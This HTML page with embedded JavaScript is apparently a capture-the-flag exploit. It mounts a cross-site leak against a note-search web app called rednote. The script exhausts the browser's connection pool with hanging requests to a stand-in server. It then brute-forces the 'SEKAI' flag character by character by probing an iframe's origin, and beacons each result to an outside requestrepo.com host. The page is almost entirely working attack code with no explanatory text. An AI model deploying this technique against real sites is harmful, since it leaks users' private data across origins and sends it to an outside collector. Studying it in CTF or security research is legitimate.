<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <iframe src="https://something.requestrepo.com/if.html"></iframe>
<script>
    SOCKETLIMIT = 255;
    INSTANCE = 'rednote.1337.sb'
    MYSERVER = `sleep.dsaidusiahdsai.xyz`
    let w;
    let res = null;
    let wds = [];
    let sockets = [];

    let actions = [];

    const sleep = (ms) => {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
    
    const fetch_sleep_long = (i) => {
        controller = new AbortController();
        const signal = controller.signal;
        
        fetch(`https://${i}.${MYSERVER}/120?q=${i}`, {
            mode: 'no-cors',
            signal: signal
        });

        return controller
    }
    
    const block_socket = async (i) => {
        sockets.push(await fetch_sleep_long(i));
        actions.push(`hanging socket ${i}`);
        await sleep(0);
    }
    
    const exhaust_sockets = async() => {
        let i = 0
        for (; i < SOCKETLIMIT; i++) {
            block_socket(i);
            await sleep(1);
        }
        console.log(`Used ${i} connections`);
    }
    
    const alphabet = '_abcdefghijklmnopqrstuvwxyz}'.split('');
 
    let gogo;


    async function quick(){
        block.abort();
        block = await fetch_sleep_long(1337);
    }

    async function step1_crash(search){
        actions.push(`setting locations, search: ${search}`);
        await sleep(100)

        block = await fetch_sleep_long(1337);
        await sleep(100);

        w1.location = `http://${INSTANCE}/search?query=${search}`;
        w2.location = `http://${INSTANCE}/search?query=${search}dsadsadsadsadsa`;

        await sleep(2000);

        frames[0].location = `http://${INSTANCE}/login`;
        actions.push(`set iframe location to http://${INSTANCE}/login`);

    }


    async function crashed(search){

        actions.push(`step1_crash starting with search set to ${search}`)
        await step1_crash(search);
        await sleep(2000);

        actions.push(`quick!`)
        quick();
        await sleep(2000);

        block.abort()

        actions.push(`ABORT!`)
    }


    async function main(){
        navigator.sendBeacon("https://something.requestrepo.com/pool", "starting poolz")
        exhaust_sockets();
        await sleep(1000);

        w1 = window.open("about:blank", "csahicsadsa", "width=1000,height=1000");
        w2 = window.open("about:blank", "ewqiewbhqehwjqn", "width=1000,height=1000");


        await sleep(1000);

        // const alphabet = "abcdefghijkmnopqrstuvwxyz_";
        // const alphabet = "abcdefghijkmnopqrstuvwxyz_";
        let alpha = "{}abcdefghijklmnopqrstuvwxyz_";
        let start_from = "{"
        
        alpha = alpha.slice(alpha.indexOf(start_from), alpha.indexOf(start_from)+5);


        let flag = "SEKAI"

        while(1){
            for(let i = 0; i < alpha.length; i++){
                await crashed(`${flag + alpha[i]}`);
                
                frames[0].postMessage(`${flag + alpha[i]}:`, "*");
                try{
                    frames[0].document
                    navigator.sendBeacon("https://something.requestrepo.com/BAD",`${flag + alpha[i]}`);
                }catch(e){
                    navigator.sendBeacon("https://something.requestrepo.com/GOOD",`${flag + alpha[i]}`);
                }

                await sleep(2000);

                // navigator.sendBeacon(`https://something.requestrepo.com/HELP`, JSON.stringify(actions));
                frames[0].location = "https://something.requestrepo.com/if.html";

                await sleep(1000)
            }

        }

    }

    main();
    
    
    </script>
</body>
</html>